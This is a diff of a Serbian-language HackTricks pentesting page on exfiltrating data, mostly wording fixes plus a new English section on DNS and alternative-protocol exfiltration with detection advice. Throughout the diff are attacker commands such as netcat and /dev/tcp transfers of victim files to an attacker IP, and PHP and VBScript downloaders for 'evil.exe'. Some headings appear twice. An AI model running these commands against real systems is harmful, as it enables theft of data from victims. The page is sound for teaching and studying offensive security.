@@ -6,7 +6,7 @@
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
@@ -16,15 +16,15 @@ Drugi načini podrške HackTricks-u:
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## Često beleženi domeni za izfiltraciju informacija
+## Često belistovane domene za izfiltriranje informacija
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često beležene domene koji mogu biti zloupotrebljeni
+Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često belistovane domene koje mogu biti zloupotrebljene
 
 ## Kopiranje\&lepljenje Base64
 
@@ -80,6 +80,8 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
 ### **HTTPS Server**
+
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -127,6 +129,8 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
+### FTP server (NodeJS)
+
 ### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
@@ -191,34 +195,78 @@ Windows
 
 ### Exfiltration
 
-#### Overview
+#### Exfiltration Over Alternative Protocol
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
+1. **Description**
+   
+   Data exfiltration can be achieved using various protocols other than HTTP/HTTPS, such as DNS, ICMP, or SMTP. These protocols are often allowed to traverse network boundaries and can be used to bypass egress filtering.
 
-- **Email**: Sending sensitive data as email attachments.
-- **FTP**: Uploading data to an FTP server.
-- **DNS**: Encoding data within DNS queries.
-- **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
-- **Cloud Storage**: Storing data in cloud storage services.
+2. **Detection**
+   
+   - Monitor network traffic for unusual DNS requests, especially those containing encoded data.
+   - Look for abnormal ICMP traffic patterns that may indicate data exfiltration.
+   - Analyze SMTP traffic for unexpected attachments or unusual sending patterns.
 
-#### Techniques
+3. **Prevention**
+   
+   - Implement egress filtering rules that restrict the use of alternative protocols.
+   - Use deep packet inspection to detect and block exfiltration attempts over alternative protocols.
+   - Encrypt sensitive data before transmission to make exfiltration more difficult.
 
-1. **Data Compression**: Compressing data before exfiltration to reduce size and avoid detection.
-2. **Data Encryption**: Encrypting data to prevent unauthorized access.
-3. **Steganography**: Hiding data within other files to avoid detection.
-4. **Data Fragmentation**: Splitting data into smaller fragments for exfiltration.
-5. **Traffic Obfuscation**: Masking exfiltration traffic to blend in with legitimate traffic.
+4. **Tools**
+   
+   - **[Iodine](https://github.com/yarrick/iodine):** Tunnel IPv4 data through a DNS server.
+   - **[ChopChop](https://github.com/MITRECND/chopchop):** Craft and send arbitrary IP packets.
+   - **[SMTP-Tester](https://github.com/le4f/smtp-tester):** Test SMTP server for open relays.
 
-#### Tools
+#### Exfiltration Over Unencrypted/Unauthenticated Protocols
 
-- **Cobalt Strike**: A popular tool for post-exploitation activities, including exfiltration.
-- **PowerShell**: Built-in Windows tool used for various exfiltration techniques.
-- **Certutil**: Command-line utility for decoding/encoding data in Windows.
-- **Bitsadmin**: Command-line tool to create and monitor BITS jobs for data transfer.
+1. **Description**
+   
+   Exfiltrating data over unencrypted or unauthenticated protocols, such as FTP or Telnet, can expose sensitive information to interception by network eavesdroppers.
 
-#### Detection
+2. **Detection**
+   
+   - Monitor network traffic for clear-text passwords or sensitive data being transmitted over unencrypted protocols.
+   - Look for unauthorized FTP or Telnet connections originating from internal hosts.
 
-Detection of exfiltration activities can be challenging due to the use of legitimate protocols and encryption. Monitoring network traffic, analyzing data transfers, and implementing data loss prevention (DLP) solutions can help in detecting and preventing data exfiltration.
+3. **Prevention**
+   
+   - Encrypt data before transmission using secure protocols like SFTP or SSH.
+   - Disable or restrict the use of unencrypted/ unauthenticated protocols within the network.
+   - Implement strong authentication mechanisms to prevent unauthorized access to sensitive services.
+
+4. **Tools**
+   
+   - **[Wireshark](https://www.wireshark.org/):** Analyze network traffic to identify clear-text data transmissions.
+   - **[Nmap](https://nmap.org/):** Scan for open FTP or Telnet ports on network devices.
+   - **[FileZilla](https://filezilla-project.org/):** Securely transfer files using SFTP/FTP over SSH.
+
+#### Exfiltration Over DNS
+
+1. **Description**
+   
+   DNS exfiltration involves encoding sensitive data within DNS queries or responses to bypass network security controls and exfiltrate data.
+
+2. **Detection**
+   
+   - Monitor DNS traffic for unusually large queries or responses that may contain exfiltrated data.
+   - Look for patterns in DNS requests that deviate from normal domain resolution behavior.
+   - Analyze DNS query timings and volume for signs of data exfiltration.
+
+3. **Prevention**
+   
+   - Implement DNS sinkholing to redirect suspicious DNS traffic to controlled servers.
+   - Use DNS firewall rules to block unauthorized DNS queries containing suspicious data.
+   - Encrypt DNS traffic using DNS over HTTPS (DoH) or DNS over TLS (DoT) to prevent eavesdropping.
+
+4. **Tools**
+   
+   - **[Dnscat2](https://github.com/iagox86/dnscat2):** Multi-platform tool for tunneling data through DNS servers.
+   - **[Dns2tcp](https://github.com/bortzmeyer/dns2tcp):** Tunnel TCP over DNS.
+   - **[dnsteal](https://github.com/m57/dnsteal):** Extract data from DNS traffic.
+
+---
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -242,16 +290,14 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Netcat
-
-Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can also be used to set up a simple file server or transfer files between systems. Netcat can be a powerful tool for exfiltrating data during a penetration test.
+Netcat (NC) je moćan alat za mrežno preusmeravanje podataka. Može se koristiti za prenos podataka između sistema putem TCP ili UDP veza. NC može biti korišćen za slanje fajlova, snimanje portova i mnoge druge mrežne operacije.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzimanje fajla sa žrtvine mašine
+### Preuzimanje fajla sa žrtve
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -285,7 +331,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete slati podatke na SMTP server, možete kreirati SMTP da primite podatke pomoću python-a:
+Ako možete poslati podatke na SMTP server, možete kreirati SMTP da primite podatke pomoću python-a:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -293,7 +339,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 Podrazumevano u XP i 2003 (u drugima mora biti eksplicitno dodato tokom instalacije)
 
-Na Kali, **pokrenite TFTP server**:
+Na Kali, **pokreni TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -316,10 +362,6 @@ Preuzmite fajl pomoću PHP jednolinijske komande:
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### VBScript Exfiltration
-
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request headers and body with the data to exfiltrate, and sending the request to the attacker's server. This technique can be used to exfiltrate sensitive information such as passwords, documents, or system information.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -357,7 +399,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog koda**. To znači da, pružajući heksadecimalni kod binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do veličine od 64 kb**.
+Program `debug.exe` ne samo što omogućava inspekciju binarnih fajlova već takođe ima **mogućnost da ih rekonstruiše iz heksadecimalnog koda**. To znači da, pružajući heksadecimalni kod binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do 64 kb veličine**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -369,7 +411,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
